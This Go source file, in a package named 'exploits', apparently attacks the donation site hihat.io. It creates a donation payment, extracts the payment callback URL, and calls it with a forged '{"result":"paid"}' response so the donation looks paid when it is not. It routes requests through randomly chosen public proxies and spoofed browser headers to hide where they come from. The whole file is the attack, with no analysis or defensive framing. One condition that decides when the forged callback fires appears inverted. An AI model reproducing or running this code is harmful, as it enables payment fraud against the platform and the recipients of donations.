package exploits

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
)

var Target string

func HihatDonate(target string) {
	Target = target
	go getNick(createPayment(target))
}

var proxyList = fetchProxies("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")

var (
	clientMu sync.Mutex
	client   *fasthttp.Client
)

func getClient() *fasthttp.Client {
	proxy := getRandomProxy()

	clientMu.Lock()
	defer clientMu.Unlock()

	if client == nil {
		client = &fasthttp.Client{
			Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
		}

	}

	return client
}

func fetchProxies(uri string) []string {
	resp, err := http.Get(uri)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	proxyList := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxyList, "\n")
}

// second
func getNick(id string) error {

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.SetMethod("GET")
	req.SetRequestURI("https://hihat.io/api/" + id)

	client := getClient()
	client.Do(req, resp)

	locationHeader := string(resp.Header.Peek("Location"))
	parsedURL, _ := url.Parse(locationHeader)
	callbackURL := parsedURL.Query().Get("callbackurl")

	if callbackURL != "" {
	} else {
		Se(callbackURL)
	}

	return nil
}

// first
func createPayment(Target string) string {
	client := &http.Client{}
	var data = strings.NewReader(`PATH=kevzter&senderName=4324&amount=1000&message=23423&number=0706606454&type=message`)
	req, err := http.NewRequest("POST", "https://hihat.io/api/purchase_donation", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://hihat.io")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", "https://hihat.io/kevzter")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Sec-GPC", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%s\n", bodyText)
	return string(bodyText)
}

// final
func Se(payid string) {

	url := payid + "&resp=" + `{"result":"paid"}` // Replace with your API endpoint
	client := getClient()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`)
	req.Header.Set("sec-ch-ua-mobile", "?1")
	req.Header.Set("sec-ch-ua-platform", `"Android"`)
	req.SetRequestURI(url)
	req.Header.SetMethod("GET")

	client.Do(req, resp)
}

func getRandomProxy() string {
	return proxyList[rand.Intn(len(proxyList))]
}
